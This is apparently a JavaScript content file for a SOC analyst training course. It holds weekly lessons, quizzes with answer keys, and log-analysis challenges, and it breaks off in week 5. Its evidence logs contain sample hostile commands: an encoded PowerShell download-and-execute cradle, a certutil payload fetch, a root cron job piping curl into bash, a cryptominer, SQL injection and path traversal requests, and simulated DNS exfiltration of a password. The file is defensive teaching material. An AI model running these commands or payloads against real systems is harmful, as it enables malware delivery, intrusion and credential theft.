// Curriculum content. Plain answers live here only; build.js hashes them.
const hex = s => Buffer.from(s, 'utf8').toString('hex');
const b64u16 = s => Buffer.from(s, 'utf16le').toString('base64');
const count = (text, re) => (text.match(re) || []).length;

/* ---------- generated evidence ---------- */
// Week 3: DNS tunnelling
const secret = 'host=FIN-PC-07;user=jsmith;pass=Winter2026!';
const chunks = hex(secret).match(/.{1,12}/g);
const benign = [
  ['10.10.5.12', 'www.google.com', 'A'], ['10.10.5.31', 'outlook.office365.com', 'A'],
  ['10.10.5.12', 'ctldl.windowsupdate.com', 'A'], ['10.10.5.44', 'teams.microsoft.com', 'A'],
  ['10.10.5.20', 'github.com', 'A'], ['10.10.5.31', 'time.windows.com', 'A'],
  ['10.10.5.12', 'fonts.gstatic.com', 'A'], ['10.10.5.20', 'pypi.org', 'A'],
];
let dnsLines = [], t = 3 * 3600 + 14 * 60 + 2, bi = 0;
const ts = s => new Date(s * 1000).toISOString().substr(11, 8);
chunks.forEach((c, i) => {
  if (bi < benign.length) { const b = benign[bi++]; dnsLines.push(`${ts(t)}  ${b[0].padEnd(11)} ${b[2].padEnd(4)} ${b[1]}`); t += 3; }
  dnsLines.push(`${ts(t)}  10.10.5.44  TXT  ${String(i).padStart(2, '0')}.${c}.cdn-telemetry.net`); t += 5;
});
const dnsEvidence = '# dns.log (time, client, type, query) - night of 2026-11-14\n' + dnsLines.join('\n');

// Week 8: encoded PowerShell
const psCmd = "IEX (New-Object Net.WebClient).DownloadString('http://91.92.240.15/stage2.ps1')";
const malEvidence = `# EDR process tree, host MKT-PC-03, user o.ceban, 2026-11-16
14:07:11  explorer.exe (pid 2210)
14:07:19   └─ WINWORD.EXE (pid 5120)  "C:\\Users\\o.ceban\\Downloads\\Offer_Nov.docm"
14:07:40       └─ cmd.exe (pid 5388)  /c certutil.exe -urlcache -split -f http://91.92.240.15/a.txt C:\\Users\\Public\\a.exe
14:07:41           └─ certutil.exe (pid 5402)  -urlcache -split -f http://91.92.240.15/a.txt C:\\Users\\Public\\a.exe
14:07:58       └─ powershell.exe (pid 5466)  -nop -w hidden -enc ${b64u16(psCmd)}
14:08:03  a.exe (pid 5510)  C:\\Users\\Public\\a.exe   sha256=9f2c1d7a4be0c35d81aa6f0e7b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e`;

// Week 9: SIEM events
const web = [
  ['10:00:03', '203.0.113.50', 404, '/admin'], ['10:00:04', '203.0.113.50', 404, '/wp-login.php'],
  ['10:00:05', '203.0.113.50', 404, '/.env'], ['10:00:06', '203.0.113.50', 404, '/phpmyadmin'],
  ['10:00:07', '203.0.113.50', 200, '/login'], ['10:00:20', '198.51.100.7', 200, '/'],
  ['10:00:41', '198.51.100.7', 404, '/favicon.ico'], ['10:01:02', '192.0.2.14', 200, '/pricing'],
  ['10:01:15', '192.0.2.14', 404, '/old-page'], ['10:01:16', '192.0.2.14', 404, '/old-page/img.png'],
  ['10:01:30', '203.0.113.50', 404, '/backup.zip'], ['10:02:00', '198.51.100.7', 200, '/contact'],
];
const auth = [
  ['10:03:01', 'admin', '203.0.113.50', 'failure'], ['10:03:02', 'admin', '203.0.113.50', 'failure'],
  ['10:03:03', 'admin', '203.0.113.50', 'failure'], ['10:03:04', 'admin', '203.0.113.50', 'failure'],
  ['10:03:05', 'admin', '203.0.113.50', 'failure'], ['10:03:06', 'admin', '203.0.113.50', 'failure'],
  ['10:03:09', 'admin', '203.0.113.50', 'success'], ['10:04:10', 'maria', '192.0.2.14', 'failure'],
  ['10:04:25', 'maria', '192.0.2.14', 'success'], ['10:05:00', 'admin', '10.0.0.8', 'failure'],
  ['10:05:12', 'admin', '10.0.0.8', 'success'], ['10:06:40', 'ion', '198.51.100.7', 'success'],
];
const siemEvidence = '# 24 events, 2026-11-15, already parsed by the SIEM\n' +
  web.map(e => `${e[0]} index=web  src_ip=${e[1]} status=${e[2]} uri=${e[3]}`).join('\n') + '\n' +
  auth.map(e => `${e[0]} index=auth user=${e[1]} src_ip=${e[2]} action=${e[3]}`).join('\n');
const c404 = {}; web.filter(e => e[2] === 404).forEach(e => c404[e[1]] = (c404[e[1]] || 0) + 1);
const top404 = Object.entries(c404).sort((a, b) => b[1] - a[1])[0][0];
const adminFail = auth.filter(e => e[1] === 'admin' && e[3] === 'failure').length;

/* ---------- hand-written evidence ---------- */
const webLog = `# /var/log/apache2/access.log - shop.northwind.example
10.0.0.15 - - [12/Nov/2026:10:01:44 +0200] "GET / HTTP/1.1" 200 8120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
198.51.100.23 - - [12/Nov/2026:10:02:11 +0200] "GET /products?id=1 HTTP/1.1" 200 5123 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
198.51.100.23 - - [12/Nov/2026:10:02:12 +0200] "GET /products?id=1%27 HTTP/1.1" 500 612 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
198.51.100.23 - - [12/Nov/2026:10:02:13 +0200] "GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 48211 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
198.51.100.23 - - [12/Nov/2026:10:02:15 +0200] "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 9120 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
10.0.0.22 - - [12/Nov/2026:10:03:02 +0200] "GET /cart HTTP/1.1" 200 3310 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)"
203.0.113.9 - - [12/Nov/2026:10:04:01 +0200] "POST /login HTTP/1.1" 401 310 "-" "python-requests/2.32.3"
203.0.113.9 - - [12/Nov/2026:10:04:01 +0200] "POST /login HTTP/1.1" 401 310 "-" "python-requests/2.32.3"
203.0.113.9 - - [12/Nov/2026:10:04:02 +0200] "POST /login HTTP/1.1" 401 310 "-" "python-requests/2.32.3"
203.0.113.9 - - [12/Nov/2026:10:04:02 +0200] "POST /login HTTP/1.1" 401 310 "-" "python-requests/2.32.3"
10.0.0.15 - - [12/Nov/2026:10:04:02 +0200] "POST /login HTTP/1.1" 401 310 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.9 - - [12/Nov/2026:10:04:03 +0200] "POST /login HTTP/1.1" 401 310 "-" "python-requests/2.32.3"
203.0.113.9 - - [12/Nov/2026:10:04:03 +0200] "POST /login HTTP/1.1" 401 310 "-" "python-requests/2.32.3"
203.0.113.9 - - [12/Nov/2026:10:04:04 +0200] "POST /login HTTP/1.1" 401 310 "-" "python-requests/2.32.3"
203.0.113.9 - - [12/Nov/2026:10:04:04 +0200] "POST /login HTTP/1.1" 401 310 "-" "python-requests/2.32.3"
203.0.113.9 - - [12/Nov/2026:10:04:05 +0200] "POST /login HTTP/1.1" 302 0 "-" "python-requests/2.32.3"
10.0.0.15 - - [12/Nov/2026:10:04:20 +0200] "POST /login HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.0.2.60 - - [12/Nov/2026:10:06:31 +0200] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1843 "-" "curl/8.5.0"
10.0.0.22 - - [12/Nov/2026:10:07:10 +0200] "GET /checkout HTTP/1.1" 200 4410 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)"`;
const bruteFails = count(webLog, /^203\.0\.113\.9 .*" 401 /gm);

const authLog = `# /var/log/auth.log - web-prod-02
Nov 13 02:11:03 web-prod-02 sshd[1811]: Failed password for root from 45.155.205.99 port 40122 ssh2
Nov 13 02:11:05 web-prod-02 sshd[1811]: Failed password for root from 45.155.205.99 port 40122 ssh2
Nov 13 02:11:08 web-prod-02 sshd[1813]: Failed password for root from 45.155.205.99 port 40130 ssh2
Nov 13 02:11:10 web-prod-02 sshd[1813]: Failed password for invalid user admin from 45.155.205.99 port 40130 ssh2
Nov 13 02:11:13 web-prod-02 sshd[1815]: Failed password for root from 45.155.205.99 port 40144 ssh2
Nov 13 02:11:15 web-prod-02 sshd[1815]: Failed password for invalid user test from 45.155.205.99 port 40144 ssh2
Nov 13 02:11:19 web-prod-02 sshd[1817]: Failed password for root from 45.155.205.99 port 40151 ssh2
Nov 13 02:11:22 web-prod-02 sshd[1817]: Failed password for deploy from 45.155.205.99 port 40151 ssh2
Nov 13 02:11:26 web-prod-02 sshd[1819]: Failed password for root from 45.155.205.99 port 40160 ssh2
Nov 13 02:11:31 web-prod-02 sshd[1821]: Accepted password for deploy from 45.155.205.99 port 40171 ssh2
Nov 13 02:11:31 web-prod-02 sshd[1821]: pam_unix(sshd:session): session opened for user deploy(uid=1001)
Nov 13 02:12:04 web-prod-02 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e
Nov 13 08:30:12 web-prod-02 sshd[2950]: Accepted publickey for ana from 10.0.0.8 port 51812 ssh2

# crontab -l (root)
*/5 * * * * curl -s http://45.155.205.99/x.sh | bash

# ps aux (extract)
root      3120 97.4  3.1  /tmp/.kworker -o pool.minexmr.com:4444 --donate-level 1 --cpu-max-threads-hint 100`;
const rootFails = count(authLog, /Failed password for root from/g);

const M = (q, o, a, why) => ({ q, o, a, why });

/* ---------- weeks ---------- */
const weeks = [
/* 1 */ {
  title: 'How a SOC thinks', module: 'Frameworks and the analyst mindset',
  goal: 'Describe any attack in the shared language of the Kill Chain, MITRE ATT&CK and the Pyramid of Pain.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: finish the module "Blue Team Introduction"', 2],
    ['thm', 'TryHackMe SOC Level 1: finish the module "Cyber Defence Frameworks" (Pyramid of Pain, Cyber Kill Chain, Unified Kill Chain, MITRE)', 3.5],
    ['own', 'Pick one public breach write-up and map 5 of its steps to ATT&CK technique IDs at attack.mitre.org', 1],
  ],
  note: 'You are 24% into this path, so most of this week is probably ticked already. Tick what is done and move straight to the quiz. Time you save here is your buffer for later weeks.',
  lesson: `<p>Every alert you will ever triage is one step of a longer story. Frameworks give you the vocabulary to say which step, so a colleague or a report reader understands in one line.</p>
<h4>Know cold</h4>
<ul><li><b>Cyber Kill Chain</b>, 7 phases in order: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives.</li>
<li><b>MITRE ATT&amp;CK</b>: a <i>tactic</i> is the attacker's goal (Persistence), a <i>technique</i> is how (T1053 Scheduled Task), a sub-technique is the exact variant (T1053.005).</li>
<li><b>Pyramid of Pain</b>, bottom to top: Hash values, IP addresses, Domain names, Network/Host artifacts, Tools, TTPs. The higher you detect, the more it costs the attacker to adapt.</li>
<li><b>Alert outcomes</b>: true positive (real attack, alert fired), false positive (benign, alert fired), false negative (real attack, no alert).</li>
<li><b>L1 job</b>: take ownership, gather context, decide TP or FP, document, escalate what is outside your scope.</li></ul>
<h4>Common trap</h4><p>Mixing up tactic and technique. Test yourself: "Phishing" is a technique (T1566); the tactic it serves is Initial Access.</p>
<h4>Say it out loud</h4><p>Without notes, explain to an imaginary interviewer why blocking a file hash is weaker than detecting a behaviour.</p>`,
  quiz: [
    M('Which level of the Pyramid of Pain is hardest for an attacker to change?', ['Hash values', 'Domain names', 'Tools', 'TTPs'], 3, 'TTPs are the attacker\'s habits and methods. Changing them means retraining and re-engineering the whole operation.'),
    M('In the Cyber Kill Chain, which phase comes directly after Delivery?', ['Installation', 'Exploitation', 'Weaponization', 'Command and Control'], 1, 'Order: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives.'),
    M('In MITRE ATT&CK, what does a tactic describe?', ['The exact command the attacker ran', 'The attacker\'s goal at that step', 'The malware family used', 'The vulnerability exploited'], 1, 'Tactic = why (goal). Technique = how.'),
    M('An attacker stole data for a week and no alert ever fired. What is this called?', ['False positive', 'True negative', 'False negative', 'True positive'], 2, 'Malicious activity happened and detection missed it: false negative, the most dangerous outcome.'),
    M('A new alert appears in the queue. What should an L1 analyst do first?', ['Close it if the severity is low', 'Take ownership and review who, what host and when', 'Immediately isolate the host', 'Escalate to L2 without reading it'], 1, 'Ownership and context come first. Verdict and action follow from evidence.'),
    M('Which detection is easiest for an attacker to bypass?', ['Rule on a file hash', 'Rule on a parent-child process pattern', 'Rule on beaconing behaviour', 'Rule on abnormal logon patterns'], 0, 'Recompiling or changing one byte gives a new hash. Behavioural detections survive that.'),
    M('When should an L1 analyst escalate to L2?', ['Whenever an alert has high severity, before investigating', 'When a true positive needs action or analysis beyond L1 scope', 'Only when a manager asks', 'Never; L1 closes all alerts'], 1, 'Escalate confirmed or likely incidents that need deeper investigation or remediation you are not authorised to perform.'),
  ],
  chal: {
    title: 'Map an intrusion to the frameworks',
    brief: 'Read the timeline and answer in framework terms. Use attack.mitre.org if you need it; that is what analysts do.',
    evidence: `# Incident timeline, finance workstation FIN-PC-07, 2026-11-09
09:02  User receives email "Invoice Q4" with attachment Invoice_Q4.docm from billing@acme-invoices.example
09:05  User opens the document and enables macros. The macro starts powershell.exe
09:05  powershell.exe downloads upd.exe from 185.220.101.47
09:06  upd.exe creates a scheduled task "OneDriveSync" that runs upd.exe at every logon
09:10  upd.exe connects to 185.220.101.47:443 every 60 seconds and waits for instructions`,
    qs: [
      ['ATT&CK technique ID (with sub-technique) for how the attacker got in at 09:02', ['T1566.001'], 'Format T####.###'],
      ['ATT&CK tactic served by the scheduled task at 09:06', ['persistence'], 'One word'],
      ['Cyber Kill Chain phase of the 09:10 activity', ['command and control', 'command & control', 'c2', 'c&c', 'command and control (c2)'], ''],
      ['You block 185.220.101.47 on the firewall. Which Pyramid of Pain level is that?', ['ip addresses', 'ip address', 'ip', 'ips'], ''],
    ],
  },
},
/* 2 */ {
  title: 'Reading the wire', module: 'Networking core and Wireshark',
  goal: 'Open a packet capture and say who talked to whom, on which port, and whether it looks like a scan or normal traffic.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Network Traffic Analysis" (Wireshark rooms and NetworkMiner)', 5],
    ['pwn', 'pwn.college, Intro to Cybersecurity dojo, module "Intercepting Communication": watch the IP and TCP lectures, solve the first 6 challenges', 2],
    ['own', 'Capture 2 minutes of your own traffic in Wireshark. Find one DNS query, one TCP handshake and one TLS Client Hello', 0.5],
  ],
  lesson: `<p>You marked networking as weak. It is also the area that separates analysts who guess from analysts who know, so this stage gives it two full weeks.</p>
<h4>Know cold</h4>
<ul><li><b>TCP handshake</b>: SYN, SYN-ACK, ACK. Open port answers SYN with SYN-ACK. Closed port answers with RST.</li>
<li><b>Ports</b>: 22 SSH, 25 SMTP, 53 DNS, 80 HTTP, 88 Kerberos, 135 RPC, 389 LDAP, 443 HTTPS, 445 SMB, 3389 RDP.</li>
<li><b>Layers</b>: Ethernet/MAC (2), IP (3), TCP/UDP (4), application (7). ARP maps IP to MAC inside one LAN.</li>
<li><b>Capture filter</b> (BPF, decides what is saved) versus <b>display filter</b> (hides packets already captured).</li></ul>
<h4>Cheat sheet</h4>
<pre>ip.addr == 10.0.0.5                       traffic to or from a host
tcp.port == 445                            one port
tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0   SYN only (scan hunting)
http.request.method == "POST"              uploads and logins
dns.qry.name contains "evil"               DNS lookups
arp.duplicate-address-detected             ARP spoofing
Statistics &gt; Conversations                 top talkers, first stop in any pcap</pre>
<h4>Common trap</h4><p>Starting to read packets one by one. Always start with Statistics (Protocol Hierarchy, Conversations, Endpoints), then filter.</p>`,
  quiz: [
    M('What is the correct order of the TCP three-way handshake?', ['SYN, ACK, SYN-ACK', 'SYN, SYN-ACK, ACK', 'ACK, SYN, SYN-ACK', 'SYN-ACK, SYN, ACK'], 1, 'Client SYN, server SYN-ACK, client ACK.'),
    M('A host sends a SYN to a closed TCP port. What normally comes back?', ['SYN-ACK', 'Nothing, always', 'RST', 'FIN'], 2, 'A closed port replies RST (shown as RST, ACK). Silence usually means a firewall dropped it.'),
    M('Which Wireshark display filter shows HTTP requests involving 10.0.0.5?', ['host 10.0.0.5 and port 80', 'ip.addr == 10.0.0.5 && http.request', 'http.host = 10.0.0.5', 'tcp contains 10.0.0.5'], 1, '"host ... and port ..." is capture-filter (BPF) syntax, not display-filter syntax.'),
    M('Which sign points to ARP poisoning on a LAN?', ['Many DNS queries', 'One MAC address claiming the gateway IP and another host\'s IP', 'TLS on port 443', 'A TTL of 64'], 1, 'The attacker answers ARP for IPs it does not own, so one MAC maps to several IPs.'),
    M('At which OSI layer does IP operate?', ['Layer 2', 'Layer 3', 'Layer 4', 'Layer 7'], 1, 'IP is the network layer (3). TCP and UDP are layer 4.'),
    M('What is the difference between a capture filter and a display filter?', ['There is none', 'Capture filters decide what is recorded; display filters only hide recorded packets', 'Display filters are faster', 'Capture filters work only on Wi-Fi'], 1, 'A packet excluded by a capture filter is gone for good.'),
    M('Which port and protocol does a normal DNS query use?', ['TCP 53 only', 'UDP 53', 'UDP 35', 'TCP 443'], 1, 'Queries normally use UDP 53. TCP 53 appears for large responses and zone transfers.'),
  ],
  chal: {
    title: 'Identify the scan',
    brief: 'This is tshark output from a server subnet. Work out who is scanning, what they found, and how you would isolate it in Wireshark.',
    evidence: `# tshark -r capture.pcap -T fields  (time  src -> dst  ports  flags)
0.000100  10.0.0.23 -> 10.0.0.5   51000 -> 21    [SYN]
0.000180  10.0.0.5  -> 10.0.0.23  21 -> 51000    [RST, ACK]
0.000310  10.0.0.23 -> 10.0.0.5   51000 -> 22    [SYN]
0.000395  10.0.0.5  -> 10.0.0.23  22 -> 51000    [SYN, ACK]
0.000450  10.0.0.23 -> 10.0.0.5   51000 -> 22    [RST]
0.000520  10.0.0.23 -> 10.0.0.5   51000 -> 23    [SYN]
0.000600  10.0.0.5  -> 10.0.0.23  23 -> 51000    [RST, ACK]
0.000710  10.0.0.23 -> 10.0.0.5   51000 -> 80    [SYN]
0.000790  10.0.0.5  -> 10.0.0.23  80 -> 51000    [SYN, ACK]
0.000840  10.0.0.23 -> 10.0.0.5   51000 -> 80    [RST]
0.000910  10.0.0.23 -> 10.0.0.5   51000 -> 443   [SYN]
0.000990  10.0.0.5  -> 10.0.0.23  443 -> 51000   [RST, ACK]
0.001100  10.0.0.23 -> 10.0.0.5   51000 -> 445   [SYN]
0.001185  10.0.0.5  -> 10.0.0.23  445 -> 51000   [SYN, ACK]
0.001240  10.0.0.23 -> 10.0.0.5   51000 -> 445   [RST]
0.001320  10.0.0.23 -> 10.0.0.5   51000 -> 3389  [SYN]
0.001400  10.0.0.5  -> 10.0.0.23  3389 -> 51000  [RST, ACK]`,
    qs: [
      ['IP address of the scanner', ['10.0.0.23'], ''],
      ['Open ports on the target, ascending, comma separated', ['22,80,445'], 'Example: 21,25'],
      ['The scanner never completes the handshake. What is this scan type called?', ['syn scan', 'syn', 'half-open', 'half open', 'half-open scan', 'stealth scan', 'stealth', 'syn stealth scan', '-ss', 'tcp syn scan', 'syn stealth'], ''],
      ['Wireshark display filter that shows only the scanner\'s SYN packets without ACK', ['tcp.flags.syn==1&&tcp.flags.ack==0', 'tcp.flags.syn==1andtcp.flags.ack==0', 'tcp.flags==0x002', 'tcp.flags==0x02', 'tcp.flags==2', 'tcp.flags.syn==1&&tcp.flags.ack==0&&ip.src==10.0.0.23', 'ip.src==10.0.0.23&&tcp.flags.syn==1&&tcp.flags.ack==0', 'tcp.flags.syn==1&&!tcp.flags.ack==1', 'tcp.flags.syn==1&&tcp.flags.ack!=1'], 'Spaces are ignored'],
    ],
  },
},
/* 3 */ {
  title: 'Watching the perimeter', module: 'Network security monitoring',
  goal: 'Recognise scanning, man-in-the-middle, tunnelling and exfiltration from network logs, and read a Snort rule.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Network Security Monitoring"', 5],
    ['pwn', 'pwn.college "Intercepting Communication": continue through the sniffing and ARP challenges (aim for 8 more)', 2],
    ['own', 'Write two Snort rules from memory: one for ICMP to your subnet, one for TCP SYN to port 3389. Check the syntax against the docs', 0.5],
  ],
  lesson: `<p>Most attacks have to cross the network at least twice: once to get in, once to talk home. Network monitoring catches both even when the endpoint is blind.</p>
<h4>Know cold</h4>
<ul><li><b>IDS</b> watches and alerts. <b>IPS</b> sits inline and can drop traffic.</li>
<li><b>Snort rule</b>: <code>action proto src_ip src_port -> dst_ip dst_port (options)</code>.</li>
<li><b>Beaconing</b>: connections at a regular interval with similar size, to the same destination.</li>
<li><b>DNS tunnelling</b>: many long, random-looking subdomains of one domain, often TXT queries, from one client.</li>
<li><b>Exfiltration</b>: unusual outbound volume, odd hours, new destination. Compare bytes out with the host's baseline.</li>
<li><b>Zeek logs</b>: conn.log (every connection), dns.log, http.log, ssl.log, files.log.</li></ul>
<h4>Cheat sheet</h4>
<pre>alert tcp any any -> $HOME_NET 3389 (msg:"RDP SYN"; flags:S; sid:1000001; rev:1;)
alert icmp any any -> $HOME_NET any (msg:"ICMP in"; sid:1000002; rev:1;)
alert udp any any -> any 53 (msg:"Large DNS"; dsize:>100; sid:1000003; rev:1;)

cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p orig_bytes | sort | uniq -c | sort -nr | head
echo 686f73743d | xxd -r -p        decode hex</pre>
<h4>Common trap</h4><p>Calling every big upload exfiltration. Check the destination and the host's role first: a backup server uploading at 03:00 is its job.</p>`,
  quiz: [
    M('What can an IPS do that an IDS cannot?', ['Read encrypted traffic', 'Block traffic inline', 'Generate alerts', 'Use signatures'], 1, 'An IPS is deployed inline and can drop packets. An IDS only observes and alerts.'),
    M('Which is the correct layout of a Snort rule header?', ['proto action src -> dst', 'action proto src_ip src_port -> dst_ip dst_port', 'action dst <- src proto', 'msg action proto'], 1, 'Example: alert tcp any any -> $HOME_NET 22.'),
    M('Which pattern most strongly suggests DNS tunnelling?', ['A few queries for www.google.com', 'Hundreds of long random subdomains of one domain from one host', 'A query answered with NXDOMAIN', 'DNS over UDP 53'], 1, 'Data is encoded into subdomain labels, so you see many unique, long, high-entropy names under one parent domain.'),
    M('A workstation connects to the same external IP every 60 seconds, each time sending about 300 bytes. What is the likely explanation?', ['Video streaming', 'C2 beaconing', 'A port scan', 'ARP poisoning'], 1, 'Regular interval plus consistent small size is the classic beacon signature.'),
    M('What does Zeek conn.log record?', ['Only DNS queries', 'A summary of every connection: endpoints, ports, duration, bytes', 'Full packet payloads', 'Windows event logs'], 1, 'conn.log is the flow record and the starting point for most Zeek investigations.'),
    M('Which attack is the usual way to become man-in-the-middle on a local network?', ['SQL injection', 'ARP spoofing', 'Kerberoasting', 'Password spraying'], 1, 'Poisoning ARP caches redirects victims\' traffic through the attacker.'),
    M('A database server uploads 40 GB to an unknown external host at 03:00. What is the best first check?', ['Reboot the server', 'Compare with the host\'s normal outbound volume and identify the destination', 'Ignore it; nights are for backups', 'Delete the database'], 1, 'Baseline and destination ownership decide whether this is a backup job or exfiltration.'),
  ],
  chal: {
    title: 'Data leaving through DNS',
    brief: 'A night-shift alert says "unusual DNS volume". Find the infected client and recover what it leaked. Copy the log into a file and use cut, grep and xxd, or CyberChef.',
    evidence: dnsEvidence,
    qs: [
      ['IP of the client doing the tunnelling', ['10.10.5.44'], ''],
      ['Parent domain used for the tunnel', ['cdn-telemetry.net', 'cdn-telemetry[.]net'], ''],
      ['How many queries carried data to that domain?', [String(chunks.length)], 'A number'],
      ['Join the hex labels in order and decode them. What password was stolen?', ['Winter2026!'], 'Case does not matter here'],
      ['Snort option that matches on payload size, as in "___:>100;"', ['dsize'], 'One keyword'],
    ],
  },
},
/* 4 */ {
  title: 'The inbox is the front door', module: 'Phishing analysis',
  goal: 'Read raw email headers, judge SPF, DKIM and DMARC results, and extract indicators safely.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Phishing Analysis"', 5],
    ['thm', 'TryHackMe SOC Simulator: run the introductory phishing scenario once and note your score', 1.5],
    ['own', 'Open a real spam email from your own mailbox, view the original headers, and write down sending IP, SPF result and Reply-To', 0.5],
  ],
  lesson: `<p>Phishing is the most common first alert for a junior analyst, and the SAL1 exam simulator leans on it. Being fast and correct here pays twice.</p>
<h4>Know cold</h4>
<ul><li><b>SPF</b>: is the sending IP allowed to send for the envelope-from (Return-Path) domain?</li>
<li><b>DKIM</b>: a signature proving the message was signed by that domain and not altered.</li>
<li><b>DMARC</b>: does the visible From domain align with a passing SPF or DKIM, and what should the receiver do if not (none, quarantine, reject)?</li>
<li><b>Received headers</b> are added by each server. Read them bottom to top to follow the path.</li>
<li><b>From</b> is what the user sees and is trivially forged. <b>Return-Path</b> and <b>Reply-To</b> show where bounces and replies really go.</li>
<li><b>Defang</b> indicators before sharing: hxxp://bad[.]example.</li></ul>
<h4>Workflow</h4>
<pre>1. Headers: sender IP, Return-Path, Reply-To, auth results
2. Body: urgency, mismatch between link text and real href
3. URLs: defang, check reputation, never click from your workstation
4. Attachments: hash it (sha256sum), look the hash up, sandbox if unknown
5. Scope: who else received it? did anyone click?</pre>
<h4>Common trap</h4><p>"SPF pass" does not mean safe. An attacker who owns evil-domain.example passes SPF for evil-domain.example perfectly.</p>`,
  quiz: [
    M('What does SPF verify?', ['That the body was not altered', 'That the sending IP is authorised for the envelope-from domain', 'That the recipient exists', 'That the attachment is clean'], 1, 'SPF is a DNS record listing which IPs may send for a domain.'),
    M('What does DKIM add to an email?', ['Encryption of the body', 'A cryptographic signature tied to the sending domain', 'A spam score', 'The sender\'s IP'], 1, 'DKIM signs selected headers and the body, so tampering and domain forgery are detectable.'),
    M('What does DMARC check?', ['Attachment types', 'That the visible From domain aligns with passing SPF or DKIM, and applies a policy', 'TLS version', 'The size of the email'], 1, 'DMARC ties the user-visible From to the authenticated domain and tells receivers what to do on failure.'),
    M('How do you follow the real path of an email through servers?', ['Read the Subject', 'Read the Received headers from bottom to top', 'Trust the From field', 'Read the Received headers top to bottom'], 1, 'Each hop prepends a Received header, so the oldest hop is at the bottom.'),
    M('Which is a correctly defanged URL?', ['http://evil.com', 'hxxp://evil[.]com', 'http//evil.com', 'evil dot com slash'], 1, 'Defanging stops accidental clicks and auto-linking while keeping the indicator readable.'),
    M('What is the safest way to assess a suspicious attachment?', ['Open it to see what happens', 'Compute its hash, check reputation, and detonate in a sandbox if unknown', 'Forward it to colleagues', 'Rename it to .txt and open'], 1, 'Never open on a production workstation. Hash lookup first, sandbox second.'),
    M('An email with no link and no attachment asks finance to pay an invoice urgently, appearing to come from the CEO. What is this?', ['Ransomware', 'Business email compromise', 'DNS tunnelling', 'A worm'], 1, 'BEC relies on impersonation and urgency. There is no malware for tools to catch.'),
  ],
  chal: {
    title: 'Dissect a reported email',
    brief: 'A user clicked "Report phishing". These are the raw headers and what the gateway extracted from the body.',
    evidence: `Return-Path: <bounce@mailer-contosopay-secure.example>
Received: from mx.northwind.example (10.0.1.5) by mbx02.northwind.example; Thu, 12 Nov 2026 09:14:27 +0200
Received: from mail.mailer-contosopay-secure.example (unknown [203.0.113.77])
        by mx.northwind.example with ESMTP; Thu, 12 Nov 2026 09:14:25 +0200
Authentication-Results: mx.northwind.example;
        spf=fail (sender IP is 203.0.113.77) smtp.mailfrom=mailer-contosopay-secure.example;
        dkim=none; dmarc=fail action=none header.from=contosopay.example
From: "Contoso Pay Support" <service@contosopay.example>
Reply-To: helpdesk.contosopay@freemail-box.example
To: i.munteanu@northwind.example
Subject: Action required: your account is limited
Date: Thu, 12 Nov 2026 09:14:20 +0200

--- extracted by gateway ---
Link text : https://www.contosopay.example/signin
Link href : hxxps://contosopay-signin[.]verify-portal[.]example/login.php
Attachment: Statement_Nov.pdf.exe  (sha256 4b1e0c6f5a2d9e8b7c3a1f0d6e5b4c3a2918f7e6d5c4b3a291807f6e5d4c3b2a)`,
    qs: [
      ['IP address of the server that handed the mail to Northwind', ['203.0.113.77'], ''],
      ['SPF result', ['fail'], 'One word'],
      ['If the user replies, which address receives it?', ['helpdesk.contosopay@freemail-box.example'], ''],
      ['Registered domain the link really leads to (not the subdomain)', ['verify-portal.example', 'verify-portal[.]example'], ''],
      ['What makes the attachment name suspicious? Name the trick', ['double extension', 'double file extension', 'doubleextension', 'double extensions'], 'Two words'],
    ],
  },
},
/* 5 */ {
  title: 'Attacks in the access log', module: 'Web security monitoring',
  goal: 'Spot SQL injection, XSS, path traversal and brute force in web logs, and judge whether the attack worked.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Web Security Monitoring"', 5],
    ['pwn', 'pwn.college, Intro to Cybersecurity, module "Web Security": first 8 challenges (path traversal, command injection, SQL injection)', 2.5],
  ],
  lesson: `<p>You will defend web apps better once you have attacked one, which is why this week pairs THM log analysis with pwn.college exploitation of the same bug classes.</p>
<h4>Know cold</h4>
<ul><li><b>Access log fields</b>: client IP, time, request line, status, size, referrer, user agent.</li>
<li><b>Status codes</b>: 200 OK, 301/302 redirect, 401 not authenticated, 403 forbidden, 404 not found, 500 server error.</li>
<li><b>SQL injection</b>: <code>' OR 1=1--</code>, <code>UNION SELECT</code>, often URL-encoded (%27 is a quote, %20 a space).</li>
<li><b>XSS</b>: <code>&lt;script&gt;</code>, <code>onerror=</code>, <code>document.cookie</code> in a parameter.</li>
<li><b>Path traversal</b>: <code>../../etc/passwd</code>, or encoded <code>..%2f</code>.</li>
<li><b>Brute force</b>: many POST /login from one IP with 401, then a 200 or 302.</li></ul>
<h4>Cheat sheet</h4>
<pre>awk '{print $1}' access.log | sort | uniq -c | sort -nr | head     top client IPs
awk '$9==401' access.log | awk '{print $1}' | sort | uniq -c       failed logins per IP
grep -Ei "union|select|%27|\\.\\./|&lt;script" access.log             attack strings
awk '{print $9}' access.log | sort | uniq -c                        status code spread</pre>
<h4>Did it work?</h4><p>Look at status and size. A 200 with a much larger response than normal, or a 500 followed by a 200, suggests the injection returned data. A wall of 403 or 404 suggests it was blocked or missed.</p>`,
  quiz: [
